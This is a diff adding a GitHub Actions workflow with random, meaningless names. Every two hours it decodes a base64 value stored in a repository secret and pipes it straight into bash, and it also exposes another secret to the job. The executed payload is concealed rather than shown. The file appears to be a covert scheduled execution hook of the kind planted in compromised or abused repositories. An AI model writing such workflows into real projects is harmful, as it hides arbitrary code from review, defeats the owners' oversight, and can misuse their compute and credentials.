@@ -1,0 +1,13 @@
+name: QnmelOvtlmB
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  DeNvfSiO:
+    runs-on: ubuntu-latest
+    env:
+      sGpyvTAwU: ${{ secrets.qqvkKUvt }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.OBbgksMmK }}" | base64 -d | bash
